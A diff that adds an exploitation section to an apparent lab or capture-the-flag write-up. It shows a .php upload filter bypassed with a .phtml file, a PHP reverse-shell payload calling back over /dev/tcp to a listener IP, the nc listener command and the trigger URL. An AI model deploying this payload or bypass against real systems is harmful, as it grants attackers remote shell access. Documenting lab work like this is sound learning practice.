@@ -55,3 +55,38 @@ Progress: 18452 / 18452 (100.00%)
 Finished
 ===============================================================
 ```
+
+---
+
+## Exploitation
+### File Upload
+<img width="1919" height="833" alt="Screenshot_2025-09-15_07-57-26" src="https://github.com/user-attachments/assets/b93eb415-3a3b-4e65-9102-f22b601ce505" />
+
+- The `/panel` directory contained an upload form.
+
+
+<img width="760" height="522" alt="image" src="https://github.com/user-attachments/assets/fc70fc64-494a-4686-8bc7-43eed3f917a9" />
+
+- Direct .php files were blocked (PHP não é permitido!).
+- Bypassed by uploading a reverse shell with .phtml extension.
+
+### Reverse Shell
+- Payload used `shell.phtml`:
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.21.4.114/4444 0>&1'");
+?>
+```
+
+- Listener started:
+```bash
+nc -lvnp 4444
+```
+- Triggered via: http://10.10.27.133/uploads/shell.phtml
+- Shell obtained as www-data:
+
+<img width="1677" height="306" alt="image" src="https://github.com/user-attachments/assets/0374431f-5818-487e-81f5-e8c205e57dc1" />
+
+---
+
+
